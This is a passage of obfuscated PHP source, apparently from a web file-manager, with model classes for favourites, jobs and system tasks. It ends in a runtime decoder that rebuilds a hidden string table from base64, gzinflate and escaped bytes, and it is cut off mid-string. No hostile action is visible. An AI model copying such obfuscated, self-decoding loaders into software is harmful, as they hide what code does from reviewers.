($ÃíĞê™ï[$¸¨èº¦©[1785]]) { $ÃíĞê™ï[$¸¨èº¦©[1778]] = array($¸¨èº¦©[1006], intval($ÃíĞê™ï[$¸¨èº¦©[1785]])); } unset($ÃíĞê™ï[$¸¨èº¦©[1785]]); } if (isset($ÃíĞê™ï[$¸¨èº¦©[1786]])) { if ($ÃíĞê™ï[$¸¨èº¦©[1786]]) { $ÃíĞê™ï[$¸¨èº¦©[1778]] = array($¸¨èº¦©[1003], intval($ÃíĞê™ï[$¸¨èº¦©[1786]])); } unset($ÃíĞê™ï[$¸¨èº¦©[1786]]); } return $this->_listData($ÃíĞê™ï); } private function _listData($”óÀè‹û) { $ìİõ¶™ƒ =& $_SERVER[Á÷ ­Šë]; $©×ÖÉ¯‚ = $this->where($”óÀè‹û)->_makeOrder()->selectPage(100); $this->_listAppendParent($©×ÖÉ¯‚[$ìİõ¶™ƒ[376]]); $this->_listAppendUser($©×ÖÉ¯‚[$ìİõ¶™ƒ[376]]); $this->_listAppendMeta($©×ÖÉ¯‚[$ìİõ¶™ƒ[376]]); return $©×ÖÉ¯‚; } private function _makeOrder() { $Â±µ³ï¦ =& $_SERVER[Á÷ ­Šë]; $¤–äú©ü = array($Â±µ³ï¦[1773], $Â±µ³ï¦[1772], $Â±µ³ï¦[204]); $Ú™‰•¾Ü = Input::get($Â±µ³ï¦[459], $Â±µ³ï¦[7], $Â±µ³ï¦[428], $¤–äú©ü); $ÄˆÆ›¿¢ = Input::get($Â±µ³ï¦[460], $Â±µ³ï¦[7], $Â±µ³ï¦[1567], array($Â±µ³ï¦[1787], $Â±µ³ï¦[455])); $«Œ€×¥Î = $Ú™‰•¾Ü . $Â±µ³ï¦[50] . $ÄˆÆ›¿¢; return $this->order($«Œ€×¥Î); } private function _listAppendParent(&$®µæúãÉ) { $àØî–£Ï =& $_SERVER[Á÷ ­Šë]; $Ì‰Ã¸Ø× = array_unique(array_to_keyvalue($®µæúãÉ, $àØî–£Ï[33], $àØî–£Ï[1770])); $Ì‰Ã¸Ø× = array_remove_value($Ì‰Ã¸Ø×, $àØî–£Ï[201]); if (!$Ì‰Ã¸Ø×) { return; } $«àªÕ™… = $this->where(array($àØî–£Ï[1771] => array($àØî–£Ï[7], $Ì‰Ã¸Ø×)))->select(); $«àªÕ™… = array_to_keyvalue($«àªÕ™…, $àØî–£Ï[1778]); foreach ($®µæúãÉ as &$ü›ÌŸâÃ) { if (isset($«àªÕ™…[$ü›ÌŸâÃ[$àØî–£Ï[1770]]])) { $ü›ÌŸâÃ[$àØî–£Ï[1788]] = $«àªÕ™…[$ü›ÌŸâÃ[$àØî–£Ï[1770]]]; } } unset($ü›ÌŸâÃ); } private function _listAppendUser(&$Ã÷»ÙÙİ) { $¦‹¬ş›± =& $_SERVER[Á÷ ­Šë]; $÷¡ÚÎó = array_unique(array_to_keyvalue($Ã÷»ÙÙİ, $¦‹¬ş›±[33], $¦‹¬ş›±[1574])); $÷¡ÚÎó = array_remove_value($÷¡ÚÎó, $¦‹¬ş›±[201]); if (count($÷¡ÚÎó) == 0) { return; } foreach ($Ã÷»ÙÙİ as $çƒù§Ô) { if (isset($çƒù§Ô[$¦‹¬ş›±[1788]])) { $÷¡ÚÎó[] = $çƒù§Ô[$¦‹¬ş›±[1788]][$¦‹¬ş›±[1574]]; } } $šÁöû˜ƒ = Model($¦‹¬ş›±[542])->userListInfo($÷¡ÚÎó); foreach ($Ã÷»ÙÙİ as &$çƒù§Ô) { $çƒù§Ô[$¦‹¬ş›±[598]] = $šÁöû˜ƒ[$çƒù§Ô[$¦‹¬ş›±[1574]]]; if (isset($çƒù§Ô[$¦‹¬ş›±[1788]])) { $çƒù§Ô[$¦‹¬ş›±[1788]][$¦‹¬ş›±[598]] = $šÁöû˜ƒ[$çƒù§Ô[$¦‹¬ş›±[1788]][$¦‹¬ş›±[1574]]]; } } unset($çƒù§Ô); } private function _listAppendMeta(&$—¯¬ƒ) { $¶¦ì½¶— =& $_SERVER[Á÷ ­Šë]; $±Æ‘¼Â¨ = array_unique(array_to_keyvalue($—¯¬ƒ, $¶¦ì½¶—[33], $¶¦ì½¶—[1778])); $±Æ‘¼Â¨ = array_remove_value($±Æ‘¼Â¨, $¶¦ì½¶—[201]); if (!$±Æ‘¼Â¨) { return; } foreach ($—¯¬ƒ as $„Øœ­é¡) { if (isset($„Øœ­é¡[$¶¦ì½¶—[1788]])) { $±Æ‘¼Â¨[] = $„Øœ­é¡[$¶¦ì½¶—[1788]][$¶¦ì½¶—[1778]]; } } $ÉĞÜ®Û¸ = $this->metaList($±Æ‘¼Â¨); if (!$ÉĞÜ®Û¸) { return !1; } foreach ($—¯¬ƒ as &$„Øœ­é¡) { $„Øœ­é¡[$¶¦ì½¶—[469]] = $ÉĞÜ®Û¸[$„Øœ­é¡[$¶¦ì½¶—[1778]]]; if (isset($„Øœ­é¡[$¶¦ì½¶—[1788]])) { $„Øœ­é¡[$¶¦ì½¶—[1788]][$¶¦ì½¶—[469]] = $ÉĞÜ®Û¸[$„Øœ­é¡[$¶¦ì½¶—[1788]][$¶¦ì½¶—[1778]]]; } } unset($„Øœ­é¡); } private function metaList($Ù²©†öã) { $úÊà§·¥ =& $_SERVER[Á÷ ­Šë]; if (!$Ù²©†öã) { return array(); } $„‰‹²« = array($úÊà§·¥[1778] => array($úÊà§·¥[7], $Ù²©†öã)); $Ç±ù½ÈÓ = Model($úÊà§·¥[1789])->where($„‰‹²«)->select(); $Ç±ù½ÈÓ = array_to_keyvalue_group($Ç±ù½ÈÓ, $úÊà§·¥[1778]); foreach ($Ç±ù½ÈÓ as $Â³ª‚ûì => $Å˜ÕıÓâ) { $õ†·ÃÔÌ = array(); foreach ($Å˜ÕıÓâ as $óƒ‡Ÿ€Ÿ) { $õ†·ÃÔÌ[$óƒ‡Ÿ€Ÿ[$úÊà§·¥[103]]] = $óƒ‡Ÿ€Ÿ[$úÊà§·¥[381]]; } $Ç±ù½ÈÓ[$Â³ª‚ûì] = $õ†·ÃÔÌ; } return $Ç±ù½ÈÓ ? $Ç±ù½ÈÓ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\154\x65\x5f\143\157\x6e\x74\145\156\x74\x73"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\x54\151\155\x65", "\x74\151\155\x65", "\151\156\x73\x65\162\x74", "\146\x75\156\x63\x74\x69\157\156")); } goto FÚŸ‡‹İøÊ; A›˜Â¤ì­±: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\164\141\163\153\114\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\x74\171\x70\x65", "\x65\166\145\156\164", "\164\151\x6d\145", "\144\x65\x73\x63", "\163\x79\x73\x74\x65\155", "\145\x6e\x61\x62\x6c\x65", "\154\x61\163\164\122\x75\156", "\163\x6f\x72\x74"); public function listData($–¿îëÜó = false, $¾êØñëô = "\163\x6f\x72\164", $Ò »ºğÑ = false) { return parent::listData($–¿îëÜó, $¾êØñëô, $Ò »ºğÑ); } public function add($ÀœÕËşÉ) { $’êò¢¨ =& $_SERVER[Á÷ ­Šë]; $£íóªº = $this->findByName($ÀœÕËşÉ[$’êò¢¨[28]]); if ($£íóªº) { return !1; } $ÀœÕËşÉ[$’êò¢¨[1535]] = 0; $ÀœÕËşÉ[$’êò¢¨[1765]] = $this->getSort(); return parent::insert($ÀœÕËşÉ); } private function getSort() { $¥ÕÈ¢¸µ =& $_SERVER[Á÷ ­Šë]; $¨Õ“½¸Æ = parent::listData(); $€âÍå·¼ = array_to_keyvalue($¨Õ“½¸Æ, $¥ÕÈ¢¸µ[33], $¥ÕÈ¢¸µ[1765]); return empty($€âÍå·¼) ? 0 : max($€âÍå·¼) + 1; } public function update($‡İ†Ï, $âš°×ğï) { $·Ãˆüõ‚ =& $_SERVER[Á÷ ­Šë]; $‰àÁÁş˜ = $this->listData($‡İ†Ï); $àØĞñÛò = $this->findByName($âš°×ğï[$·Ãˆüõ‚[28]]); if (!$‰àÁÁş˜ || $àØĞñÛò && $àØĞñÛò[$·Ãˆüõ‚[404]] != $‰àÁÁş˜[$·Ãˆüõ‚[404]]) { return !1; } return parent::update($‡İ†Ï, $âš°×ğï); } public function remove($Í¬ûğü·, $¢Æ®åÏã = false) { $¸£—ÈŸ£ =& $_SERVER[Á÷ ­Šë]; $Û’éü = $this->listData($Í¬ûğü·); if (!$Û’éü) { return; } if (!$¢Æ®åÏã && $Û’éü[$¸£—ÈŸ£[1202]] == $¸£—ÈŸ£[97]) { return !1; } return parent::remove($Í¬ûğü·); } public function enable($ößÇØÆŞ, $¬Û™ƒæ) { return $this->update($ößÇØÆŞ, array($_SERVER[Á÷ ­Šë][2156] => $¬Û™ƒæ)); } public function run($İµè¥’) { return $this->update($İµè¥’, array($_SERVER[Á÷ ­Šë][2166] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($âÕ˜á’¦) { $£½øß°º =& $_SERVER[Á÷ ­Šë]; return array($£½øß°º[1852] => array(USER_ID, $£½øß°º[2167])); } protected function listData() { $“è×è“ã =& $_SERVER[Á÷ ­Šë]; $ÎÒ…Ùº“ = array($“è×è“ã[1565] => USER_ID, $“è×è“ã[487] => 0); $¬”œ‘ = $“è×è“ã[2168]; $¶ê­¤Á“ = $this->field($¬”œ‘)->where($ÎÒ…Ùº“)->order($“è×è“ã[2169])->select(); return $¶ê­¤Á“ ? $¶ê­¤Á“ : array(); } protected function resetCache() { } protected function listView() { $ê·ïĞÖ =& $_SERVER[Á÷ ­Šë]; $ŒìÚÛĞç = $this->listData(); $…ÀĞäÁ¸ = array_filter_by_field($ŒìÚÛĞç, $ê·ïĞÖ[29], $ê·ïĞÖ[421]); $¢•ªè“Ó = array_to_keyvalue($…ÀĞäÁ¸, $ê·ïĞÖ[33], $ê·ïĞÖ[86]); if (!$¢•ªè“Ó) { return $ŒìÚÛĞç; } $™¼äŞãª = 2000; $çşÀñªŒ = array($ê·ïĞÖ[422] => array($ê·ïĞÖ[423], $¢•ªè“Ó)); $¾€¿¶Ï¨ = Model($ê·ïĞÖ[827])->listSource($çşÀñªŒ, $™¼äŞãª); $¾€¿¶Ï¨ = array_merge($¾€¿¶Ï¨[$ê·ïĞÖ[84]], $¾€¿¶Ï¨[$ê·ïĞÖ[85]]); $¾€¿¶Ï¨ = array_to_keyvalue($¾€¿¶Ï¨, $ê·ïĞÖ[407]); foreach ($ŒìÚÛĞç as $ÙÌåâÁÈ => $Æ‘İ§Òª) { $úä¦äã• = $¾€¿¶Ï¨[$Æ‘İ§Òª[$ê·ïĞÖ[86]]]; $úä¦äã• = $úä¦äã• ? $úä¦äã• : array(); $ŒìÚÛĞç[$ÙÌåâÁÈ] = array_merge($úä¦äã•, $Æ‘İ§Òª); } return $ŒìÚÛĞç; } protected function addFav($õÅôº¿¢, $•Ò™ò¹¾ = '', $Öä®ìšö = "\163\x6f\165\162\x63\x65") { $—ÁÉˆÙ =& $_SERVER[Á÷ ­Šë]; $¸ëóÛ‹· = array($—ÁÉˆÙ[1565] => USER_ID, $—ÁÉˆÙ[487] => 0, $—ÁÉˆÙ[427] => $Öä®ìšö, $—ÁÉˆÙ[426] => $õÅôº¿¢); if ($this->where($¸ëóÛ‹·)->find()) { return !1; } $¸ëóÛ‹· = array($—ÁÉˆÙ[1565] => USER_ID, $—ÁÉˆÙ[487] => 0); $™Â§é¢Ğ = $this->where($¸ëóÛ‹·)->max($—ÁÉˆÙ[1765]); if (!$™Â§é¢Ğ) { $™Â§é¢Ğ = 0; } if (!$•Ò™ò¹¾ && $Öä®ìšö == $—ÁÉˆÙ[421]) { $÷Ùš¡â = Model($—ÁÉˆÙ[1249])->where(array($—ÁÉˆÙ[422] => $õÅôº¿¢))->find(); if (!$÷Ùš¡â) { return !1; } $•Ò™ò¹¾ = $÷Ùš¡â[$—ÁÉˆÙ[28]]; } $•Ò™ò¹¾ = $this->getAutoName($•Ò™ò¹¾); $õÎ‰«Á§ = array($—ÁÉˆÙ[1565] => USER_ID, $—ÁÉˆÙ[487] => 0, $—ÁÉˆÙ[425] => $•Ò™ò¹¾, $—ÁÉˆÙ[426] => $õÅôº¿¢, $—ÁÉˆÙ[427] => $Öä®ìšö, $—ÁÉˆÙ[1746] => $™Â§é¢Ğ + 1); return $this->add($õÎ‰«Á§); } protected function remove($’Ù×º) { $‡şîñ³¥ =& $_SERVER[Á÷ ­Šë]; $¾™Ş”ø” = array($‡şîñ³¥[1565] => USER_ID, $‡şîñ³¥[424] => $’Ù×º); return $this->where($¾™Ş”ø”)->delete(); } protected function removeByName($ÙÖ†Å®”) { $¢ÄÜéë =& $_SERVER[Á÷ ­Šë]; $‘ßÏØÉÈ = array($¢ÄÜéë[1565] => USER_ID, $¢ÄÜéë[425] => $ÙÖ†Å®”, $¢ÄÜéë[487] => 0); return $this->where($‘ßÏØÉÈ)->delete(); } protected function rename($éµËà«¬, $¡ Ÿ§É…) { $Š©Ëéüè =& $_SERVER[Á÷ ­Šë]; if ($éµËà«¬ == $¡ Ÿ§É…) { return !1; } $Ç´ôú » = $this->getAutoName($¡ Ÿ§É…); if ($¡ Ÿ§É… != $Ç´ôú ») { return !1; } $èÅ¥À™ú = array($Š©Ëéüè[1565] => USER_ID, $Š©Ëéüè[487] => 0, $Š©Ëéüè[28] => $éµËà«¬); return $this->where($èÅ¥À™ú)->save(array($Š©Ëéüè[28] => $¡ Ÿ§É…)); } protected function resetSort($Ûõ×¿æé) { $ÇßÇÓ½˜ =& $_SERVER[Á÷ ­Šë]; $Ûõ×¿æé = is_array($Ûõ×¿æé) ? $Ûõ×¿æé : array(); $ê¶Ìéç = array($ÇßÇÓ½˜[1565] => USER_ID); for ($àšÇúéÜ = 0; $àšÇúéÜ < count($Ûõ×¿æé); $àšÇúéÜ++) { $ê¶Ìéç[$ÇßÇÓ½˜[424]] = $Ûõ×¿æé[$àšÇúéÜ]; $this->where($ê¶Ìéç)->save(array($ÇßÇÓ½˜[1746] => $àšÇúéÜ + 1)); } return !0; } protected function moveTop($ğ•²ñÈ¯) { $ÍıÑ÷×  =& $_SERVER[Á÷ ­Šë]; $äÓÀ­Òò = array($ÍıÑ÷× [1565] => USER_ID, $ÍıÑ÷× [487] => 0); $Ö•ÒÛê¼ = $this->where($äÓÀ­Òò)->where(array($ÍıÑ÷× [28] => $ğ•²ñÈ¯))->find(); if (!$Ö•ÒÛê¼) { return; } $•ÆÅæ…Ş = $this->field($ÍıÑ÷× [404])->where($äÓÀ­Òò)->order($ÍıÑ÷× [2169])->select(); $•ÆÅæ…Ş = array_to_keyvalue($•ÆÅæ…Ş, $ÍıÑ÷× [33], $ÍıÑ÷× [404]); $…¢×æÂ = $•ÆÅæ…Ş; $•ÆÅæ…Ş = array_remove_value($•ÆÅæ…Ş, $Ö•ÒÛê¼[$ÍıÑ÷× [404]]); array_unshift($•ÆÅæ…Ş, $Ö•ÒÛê¼[$ÍıÑ÷× [404]]); return $this->resetSort($•ÆÅæ…Ş); } protected function moveBottom($¿©”·â…) { $“Óı¯ŠŠ =& $_SERVER[Á÷ ­Šë]; $ÅæÆ±‚¶ = array($“Óı¯ŠŠ[1565] => USER_ID, $“Óı¯ŠŠ[487] => 0); $¶ïøı´ş = $this->where($ÅæÆ±‚¶)->max($“Óı¯ŠŠ[1765]); $šÖå©Û = array($“Óı¯ŠŠ[1765] => $¶ïøı´ş + 1); return $this->where($ÅæÆ±‚¶)->where(array($“Óı¯ŠŠ[28] => $¿©”·â…))->save($šÖå©Û); } private function getAutoName($½ûµõí·) { $Óöó®¸© =& $_SERVER[Á÷ ­Šë]; $ÙÅƒÀÙ = array($Óöó®¸©[1565] => USER_ID, $Óöó®¸©[487] => 0); $ ¢ğØ‹ì = $this->field($Óöó®¸©[28])->where($ÙÅƒÀÙ)->select(); $ ¢ğØ‹ì = array_to_keyvalue($ ¢ğØ‹ì, $Óöó®¸©[33], $Óöó®¸©[28]); if (!$ ¢ğØ‹ì || !in_array($½ûµõí·, $ ¢ğØ‹ì)) { return $½ûµõí·; } for ($ØóÈ—åš = 0; $ØóÈ—åš < count($ ¢ğØ‹ì); $ØóÈ—åš++) { if (!in_array($½ûµõí· . "\50{$ØóÈ—åš}\51", $ ¢ğØ‹ì)) { return $½ûµõí· . "\50{$ØóÈ—åš}\x29"; } } return $½ûµõí· . "\x28{$ØóÈ—åš}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\x6a\x6f\x62\x4c\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\144\x65\x73\143", "\163\x6f\x72\x74"); const JOB_KEY = "\163\145\x6c\x66\x4a\157\142\114\151\x73\x74"; public function listData($¹ğ‡éóã = false, $Ö’ÎÓ„¹ = "\163\x6f\x72\x74", $¡ÍÍìæë = false) { return parent::listData($¹ğ‡éóã, $Ö’ÎÓ„¹, $¡ÍÍìæë); } public function remove($ïÔò€öö) { return parent::remove($ïÔò€öö); } public function add($°ıÔƒ¹½) { $”Ï¿Óç =& $_SERVER[Á÷ ­Šë]; if ($this->findByName($°ıÔƒ¹½[$”Ï¿Óç[28]])) { return !1; } $°ıÔƒ¹½[$”Ï¿Óç[1765]] = $this->getSort(); return parent::insert($°ıÔƒ¹½); } private function getSort() { $‰ŸÏ‹ö =& $_SERVER[Á÷ ­Šë]; $àšµÎı• = parent::listData(); $º¾Õ–ñã = array_to_keyvalue($àšµÎı•, $‰ŸÏ‹ö[33], $‰ŸÏ‹ö[1765]); return empty($º¾Õ–ñã) ? 0 : max($º¾Õ–ñã) + 1; } public function update($ÕÒ–Ğ‚ã, $¡ûé†¤Ä) { $Ÿû¹¨„³ =& $_SERVER[Á÷ ­Šë]; $²¤ƒĞ£¦ = parent::listData($ÕÒ–Ğ‚ã); $î»å¾‰‘ = $this->findByName($¡ûé†¤Ä[$Ÿû¹¨„³[28]]); if (!$²¤ƒĞ£¦ || $î»å¾‰‘ && $î»å¾‰‘[$Ÿû¹¨„³[404]] != $²¤ƒĞ£¦[$Ÿû¹¨„³[404]]) { return !1; } return parent::update($ÕÒ–Ğ‚ã, $¡ûé†¤Ä); } public function setUserJob($ÊêÇ­ã‘, $ŒÅÎíÊÅ) { $«Àıšê§ =& $_SERVER[Á÷ ­Šë]; if (!is_array($ŒÅÎíÊÅ)) { $ŒÅÎíÊÅ = array($ŒÅÎíÊÅ); } $€¥Ç¨âË = parent::listData(); $Ô×ò´î¹ = array_to_keyvalue($€¥Ç¨âË, $«Àıšê§[28]); $è††æÛû = $«Àıšê§[385]; foreach ($ŒÅÎíÊÅ as $àöÒ•ßş) { if ($Ô×ò´î¹[$àöÒ•ßş]) { $è††æÛû .= $Ô×ò´î¹[$àöÒ•ßş][$«Àıšê§[404]] . $«Àıšê§[47]; } else { $¹¶ıÈâ– = $this->add($àöÒ•ßş); $è††æÛû .= $¹¶ıÈâ– . $«Àıšê§[47]; } } $è††æÛû = rtrim($è††æÛû, $«Àıšê§[47]); Model($«Àıšê§[542])->metaSet($ÊêÇ­ã‘, self::JOB_KEY, $è††æÛû); } public function getUserJob($¼œÆòëƒ) { $åúû—†¤ = Model($_SERVER[Á÷ ­Šë][542])->metaGet($¼œÆòëƒ); return $this->getUserJobInfo($åúû—†¤[self::JOB_KEY]); } public function getUserJobInfo($•ğ¿‘’å) { $£ÓÂó³‰ =& $_SERVER[Á÷ ­Šë]; $ŒÅº¾à’ = explode($£ÓÂó³‰[47], $•ğ¿‘’å); $»äÃŒ¿ = parent::listData(); $»äÃŒ¿ = array_remove_key($»äÃŒ¿, $£ÓÂó³‰[204]); $±µ†±Í« = array(); foreach ($ŒÅº¾à’ as $´Œªë) { if (isset($»äÃŒ¿[$´Œªë])) { $±µ†±Í«[] = $»äÃŒ¿[$´Œªë]; } } return $±µ†±Í«; } } goto b¸Ó±É ”…; e¤‹ó…Üùõ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('wfegrYrr'), base64_decode('vZn309vi')); $_SERVER[Á÷ ­Šë] = explode("\x7c\x1\x7c\x2\x7c\x1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xd5\x68\x29\x5\x42\x5a\x5a\xfe\xd7\xfe\x94\xbd\x13\x43\x12\xc7\xd1\x62\x3b\x89\x93\x38\x71\x12\xd9\x96\x6d\x11\xd9\x72"."\44\71\233\355\50\43\151\154\215\55\151\344\231\221\267\44\55\173\200\260\265\54\205\320\122\50\245\100\131\302\126\312\26\366\265\154\341\347\147\51\51\113\41\11\111\11".base64_decode('tBTC3vbd5dxlRjL873vv+14g0b3nLnOXc88959xzz3372VtO/uDm9fut/+b6/Q==')."\x9e\xdb\xf7\xf0\x4d\xb7\x9f\x4a\xc3\xe8\xbf\x3\xc8\xbf\x28\xfc\xa3\x4d\x93\xbe\x41\xfe\x7c\x7f\xd3\x59\x95\x95\x6d\x75\x93\x67\x76\x7c\xe7\xbc\xdb\x6f\x54\x6f\x50\x6f\x54\xcf\x8e\x84".base64_decode('n3o6dMizN5wQ3HXVU2O79vvGKWdec0Q9ykzL1tMfJW/YijaqW7ZFASkj36f30w==')._kodDe('MIyerZXobPtRY1ORSTLPEjV2jGNj9GTfkcLylRZ61XIimPjUl+COVHDWSGBBd2M=')."\x82\x51\xd0\xf2\xe\x88\x0\xa4\x55\x5b\x4d\xaa\x16\xd4\xd4\xdc\x98\x68\xe\x76\x86\x23\xab\x12\xf1\x55\x9d\x41\xc8\x91\x4c\xc\x15\x35\x73\x8c\xc6\x48\x30\x66\xab\xa6\x1d\xd7\x73\x1a"."\317\61\142\362\166\65\6\133\103\35\112\74\32\350\210\5\232\342\241\110\7\5\67\105\332\333\103\361\122\170\64\22\16\67\6\232\226\226\246\164\106\3\255\355\1\5"."\xb5\x2f\xab\x25\xf4\x7c\x9f\x51\xa9\xac\xa5\x29\x6b\x95\x19\x34\xd0\xa2\x6b\xd9\x34\xd\xe6\x55\xd6\x1c\x7b\xac\x0\xa1\x38\xf\xa1\x39\xc8\x17\xb3\x59\x1a\xe9\xe0\x21\x68\xbf\xd6\xa7"."\26\263\60\146\315\162\244\140\352\71\225\165\175\251\66\306\241\64\240\26\155\103\317\247\150\44\70\152\233\252\200\243\26\247\114\55\247\345\241\252\130\60\34\154\212\53"."\xb8\x99\x4a\x4b\x34\xd2\xae\xc0\x54\xe4\x54\xcb\xd6\x4c\x65\x45\x5b\x30\x1a\x54\x70\xd3\x1b\xa6\x93\x1e\x4f\x57\x68\xb9\xae\xe\x34\x20\x4a\x20\x1c\x56\x26\xaa\xc1\xd6\x72\x5\x56\xd"."\x2d\x53\xa6\xb2\x48\xb4\x39\x18\x55\x1a\x57\x29\x62\x9c\x52\x46\x2e\x67\xe4\x7d\xa8\x16\x34\x9f\xb6\xd4\xd4\x60\x34\x4a\x3\x1e\xc0\xe0\x70\x8\x4f\x1d\x44\x22\x2d\x2d\xb1\x20\x8f\x41".base64_decode('55aFUUtmAZY6Yum+rJ0YVrNFhqyD9Hc6/MBvQu3Ts1pMH9dCeTeExnEs0a/ZCQ==')."\xb4\x7e\x6c\xd4\x56\x40\xf8\xc6\x40\x2c\xd4\x94\xe8\xc\xc4\xdb\x60\xec\xb\x5\xbf\x95\x1e\xb4\xfc\xaa\x99\xca\xe8\xc3\x5a\x58\x4f\xfa\x93\x7a\xde\x8f\x11\xdd\x97\x64\xeb\x6d\x32\xfd"."\x99\xd\x23\x91\xd1\x52\x83\x9\x35\x69\x98\xb6\x6\xe8\x54\xcc\x67\xf5\xfc\xa0\xdc\x12\x1a\x36\x2c\xf8\xee\x90\x9e\xd7\x8b\xb0\xa8\xa0\xab\x86\xc1\x57\x38\x4\x8a\x2c\xb7\xc6\x20\x5a".base64_decode('GgI5VN4AIoB6NEyDDYvo7wLIlMS9HdZMO6HlU0ZazwPdWAwtg5Wi2plmE3XWhA==')."\12\15\137\312\50\214\265\33\303\322\330\205\71\131\350\63\262\151\315\24\361\2\52\56\247\100\257\34\43\337\121\314\311\131\170\24\215\161\66\155\62\152\362\125\71\21"."\xbd\xd2\xfb\xc6\x4\xd5\xb0\x8c\xa2\x99\x42\xb3\xdd\x67\x88\xb2\x9d\xbc\x25\x35\x90\x49\xb3\x6d\xd4\x69\x8b\xf5\xab\xab\x90\x35\xd4\x74\x4c\x33\xa5\xbe\xb6\xa0\x82\x91\xa2\x2d\x3\x8b"._kodDe('L0oTUHqJ1aPA5rKZwKrFE7mh+4xkdYX2v6hj6qHeE2muhqpuj+9V3YCVcKNUJVs=')."\241\215\152\260\376\163\351\71\26\353\253\337\302\50\207\40\64\32\212\44\62\252\225\151\117\317\111\220\122\214\366\247\265\121\137\41\123\0\22\305\251\122\217\143\175\342"._kodDe('MdbG2R2hjVFwgXqChzdoBrAbyKGxp2lQcsdYtgXugFUYnvkqiEc3RFYWQ+Jaqmc=').base64_decode('xQrmsjzEesdhFgfao4AxFRDXRm0YFGVBKqOaaLoainafdx5fi1k9pdq6kfcbKQ==')."\133\263\275\226\155\152\52\324\26\110\245\64\313\362\66\241\345\154\32\131\157\40\233\65\106\274\21\123\357\327\363\365\112\25\354\32\164\255\173\61\45\257\7\142\123\261"."\100\301\270\202\11\131\25\375\32\43\42\74\267\251\346\255\76\315\364\6\141\321\324\53\150\76\70\41\147\331\232\165\253\140\130\72\156\136\275\242\332\266\232\312\140\42"."\x28\xaa\x6f\xf8\x8a\xfc\x3a\x26\x10\x5a\x49\xde\xe0\x68\x41\x37\x35\x8b\xb5\x55\x69\x6d\x8f\x43\x25\xa8\x76\xcd\xdb\x69\xaa\xfd\x39\xb5\x5e\x29\x14\x93\x68\x64\x60\xf5\x96\x81\xd1\xdc"."\x30\x34\xf5\x4a\xa\x47\x3d\x4a\xae\x68\xd9\x5e\x53\x43\xd4\x54\x47\xe4\xc\xe6\x38\xd4\xe7\x6d\xc7\x4b\x4b\xd7\xd2\xde\x18\xda\x74\x0\x3c\xab\x7a\xb6\x82\xd0\x46\x61\x69\x14\xda\x16".strrev('‡Ñ3DcNÀ}@êÄa‰h½+€ÉW„­£mgí[Aš &ñÚ&è·ˆ-B&w')."\xc7\xea\x95\x41\x23\x9d\x34\x46\x7d\x2c\xa9\x5\xa8\x37\xcb\x8c\xa7\xbb\x60\x7b\xa3\x6a\xbe\x1f\x8f\x4f\x72\xcc\xd6\x0\xfd\xac\xe1\x7e\xe7\x40\x87\xb5\x7c\xbf\x9d\x61\x5\x63\xc1\xe8".strrev('…¥…‹ÅKÏÁåG€µ9Y²ŸCF–¨Ş³ªáO²Œ–ä•À¢WÄ´‹4`ò')."\103\255\170\140\232\275\26\312\344\225\163\261\272\303\172\116\307\155\267\171\12\31\111\304\262\264\102\203\374\244\103\15\75\231\252\312\236\364\314\31\136\364\157\325\214\356"."\236\146\137\125\357\142\277\56\312\370\153\174\65\112\155\165\235\322\211\170\50\135\315\52\320\351\222\34\325\112\144\351\127\14\0\336\142\245\145\355\32\72\12\214\6\227"."\165\5\143\361\104\173\60\336\26\151\206\57\4\3\20\12\33\164\151\262\36\165\323\237\136\237\240\307\150\316\103\71\265\337\105\245\161\254\335\60\65\47\104\354\32\53".base64_decode('9DQj4zjapun9GeifjmtLGVnDVLOYijEk1hhl6df7YH4owRSRmJ4rMLpmZ4q5pA==').strrev('UiM-$.2§#iÃ ¿ô,ØşÌ£mjqıê†m¡½¾d½¶oš3ìd').base64_decode('OVLaNFXsl7ZpGxhqOrK0a3bGgElC3As0qcjbxlqZ1rIaG42Mxkh6NWRDOxMfKw==')."\301\214\40\6\23\101\305\226\252\133\121\124\22\63\174\54\276\2\363\345\2\140\363\254\131\264\233\104\222\3\150\271\0\47\241\133\55\322\346\237\60\110\32\152\274\52"."\362\167\232\132\237\16\213\56\217\146\254\135\65\7\131\1\64\103\142\333\301\21\251\262\226\256\160\70\321\24\351\210\43\136\237\102\126\104\103\361\40\303\321\100\163\42".strrev('±Í:È-7¤|Í-ä`¹ÔFk­³˜‚YlH¥k†B€İÒŒã1Q7ÉÔĞ')."\xc0\x45\xd3\x4b\x4a\x8\x9\x63\xd4\xab\xe6\xc6\xbd\x39\x34\x4c\x5e\xde\x74\xe7\xe\xab\xc4\xe5\x8d\x3a\x4\xf3\x2a\xc8\x37\x1e\x58\x24\xc0\xb1\xad\xbd\x33\x12\x83\x2\x8b\x31\x14\x71"."\x4f\x49\xcd\x84\x76\x74\x76\x41\x52\x4e\xc2\xa9\xd6\x60\x9c\x6d\xd3\x2a\x30\x4d\x81\x15\x31\x46\x73\x8b\x28\xa3\xa9\x8f\xab\xa2\x73\x8b\x59\x43\xa0\xd2\xd1\x5c\x56\x70\x82\xce\xee\x78"."\xc5\x24\xc4\xdb\x42\x1d\x4b\x13\xed\x91\xe6\x60\x38\x11\xea\x40\x4\x29\x5e\xa\xef\xea\x6c\xe\xb0\x59\x95\xe1\x8d\x11\xc6\x9b\x3\xb4\xb\x91\xa4\xe5\x81\x70\xc8\x9d\x3d\xb8\x32\x14".base64_decode('i8fKJiFYV9CVgoTVzmiwJbSSR1tCwXBzLNEUaGoTeToC7RBJ9GFx0fI78ycQbQ==').base64_decode('jXGhMzGMBWiDyyCyhJdgsktCIADaJzVAOuguFttJT4A5TxlFhoacP8wxcpJTYQ==')."\x3d\xa9\x6c\xf\xac\xa4\x3f\x